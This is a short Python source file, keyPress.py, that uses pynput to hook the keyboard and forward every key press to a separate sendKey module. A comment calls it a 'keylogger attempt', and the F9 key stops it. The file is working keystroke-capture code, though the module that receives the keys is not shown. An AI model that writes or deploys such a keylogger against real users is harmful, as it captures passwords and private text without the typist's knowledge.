####################################################
# FILE : keyPress.py
# WRITER : Ohad_Beltzer , oBit91
# DESCRIPTION : Listens to buttons keyboard presses.
####################################################


from pynput.keyboard import Listener
import sendKey

def on_press(key):


    # formats key pressed
    key_pressed = '{0}'.format(key)
    ### sends a message upon pressing F8
    # if key_pressed == "Key.f8":
    #     sendKey.key_press()

    ### keylogger attempt
    sendKey.key_press(key)

    # ends the listener
    if key_pressed == "Key.f9":
        return False


def on_release(key):

    # not really used, just exiting.
    return
    # print('{0} release'.format(
    #     key))
    # if key == Key.esc:
        # return False

# Collect events until released
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()